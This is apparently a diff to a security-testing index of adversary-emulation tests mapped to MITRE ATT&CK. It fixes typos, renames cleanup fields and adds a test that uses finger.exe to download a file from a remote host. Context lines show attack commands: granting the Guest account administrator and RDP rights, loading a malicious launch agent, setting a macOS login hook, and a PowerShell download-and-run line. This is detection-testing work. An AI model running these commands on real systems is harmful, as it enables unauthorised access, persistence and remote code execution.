@@ -11581,7 +11581,7 @@ privilege-escalation:
       - Containers
       identifier: T1078.001
     atomic_tests:
-    - name: Enable Guest account with RDP capability and admin priviliges
+    - name: Enable Guest account with RDP capability and admin privileges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
       description: |
         After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
@@ -13483,7 +13483,7 @@ privilege-escalation:
           if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
           sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}
           sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}
-        cleanup: |
+        cleanup_command: |
           sudo launchctl unload ~/Library/LaunchAgents/#{plist_filename}
           sudo rm ~/Library/LaunchAgents/#{plist_filename}
   T1543.004:
@@ -13739,7 +13739,7 @@ privilege-escalation:
       x_mitre_version: '1.1'
       identifier: T1078.003
     atomic_tests:
-    - name: Create local account with admin priviliges
+    - name: Create local account with admin privileges
       auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
       description: After execution the new account will be active and added to the
         Administrators group
@@ -15885,7 +15885,7 @@ privilege-escalation:
         command: 'sudo defaults write com.apple.loginwindow LoginHook #{script}
 
 '
-        cleanup: 'sudo defaults delete com.apple.loginwindow LoginHook
+        cleanup_command: 'sudo defaults delete com.apple.loginwindow LoginHook
 
 '
         elevation_required: true
@@ -21806,7 +21806,7 @@ defense-evasion:
       - Containers
       identifier: T1078.001
     atomic_tests:
-    - name: Enable Guest account with RDP capability and admin priviliges
+    - name: Enable Guest account with RDP capability and admin privileges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
       description: |
         After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
@@ -27356,7 +27356,7 @@ defense-evasion:
       x_mitre_version: '1.1'
       identifier: T1078.003
     atomic_tests:
-    - name: Create local account with admin priviliges
+    - name: Create local account with admin privileges
       auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
       description: After execution the new account will be active and added to the
         Administrators group
@@ -39900,7 +39900,7 @@ persistence:
       - Containers
       identifier: T1078.001
     atomic_tests:
-    - name: Enable Guest account with RDP capability and admin priviliges
+    - name: Enable Guest account with RDP capability and admin privileges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
       description: |
         After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
@@ -41558,7 +41558,7 @@ persistence:
           if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
           sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}
           sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}
-        cleanup: |
+        cleanup_command: |
           sudo launchctl unload ~/Library/LaunchAgents/#{plist_filename}
           sudo rm ~/Library/LaunchAgents/#{plist_filename}
   T1543.004:
@@ -42006,7 +42006,7 @@ persistence:
       x_mitre_version: '1.1'
       identifier: T1078.003
     atomic_tests:
-    - name: Create local account with admin priviliges
+    - name: Create local account with admin privileges
       auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
       description: After execution the new account will be active and added to the
         Administrators group
@@ -44102,7 +44102,7 @@ persistence:
         command: 'sudo defaults write com.apple.loginwindow LoginHook #{script}
 
 '
-        cleanup: 'sudo defaults delete com.apple.loginwindow LoginHook
+        cleanup_command: 'sudo defaults delete com.apple.loginwindow LoginHook
 
 '
         elevation_required: true
@@ -58087,10 +58087,17 @@ execution:
           description: Command to run
           type: String
           default: uname
-      executor:
+      dependencies:
+      - description: 'kubectl must be installed
+
+'
+        get_prereq_command: 'echo "kubectl must be installed manually"
+
+'
         prereq_command: 'which kubectl
 
 '
+      executor:
         command: |
           kubectl create -f src/busybox.yaml -n #{namespace}
           kubectl exec -n #{namespace} busybox -- #{command}
@@ -65389,6 +65396,25 @@ command-and-control:
         command: "(New-Object Net.WebClient).DownloadString('#{target_remote_file}')
           | Out-File #{output_file}; Invoke-Item #{output_file}\n"
         name: powershell
+    - name: File download with finger.exe on Windows
+      auto_generated_guid: 5f507e45-8411-4f99-84e7-e38530c45d01
+      description: |
+        Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.
+        Because this is being tested on the localhost, you should not be expecting a successful connection
+        https://www.exploit-db.com/exploits/48815
+        https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_host:
+          description: Remote hostname or IP address
+          type: String
+          default: localhost
+      executor:
+        name: command_prompt
+        command: 'finger base64_filedata@#{remote_host}
+
+'
   T1090.001:
     technique:
       external_references:
@@ -68131,7 +68157,7 @@ initial-access:
       - Containers
       identifier: T1078.001
     atomic_tests:
-    - name: Enable Guest account with RDP capability and admin priviliges
+    - name: Enable Guest account with RDP capability and admin privileges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
       description: |
         After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
@@ -68630,7 +68656,7 @@ initial-access:
       x_mitre_version: '1.1'
       identifier: T1078.003
     atomic_tests:
-    - name: Create local account with admin priviliges
+    - name: Create local account with admin privileges
       auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
       description: After execution the new account will be active and added to the
         Administrators group
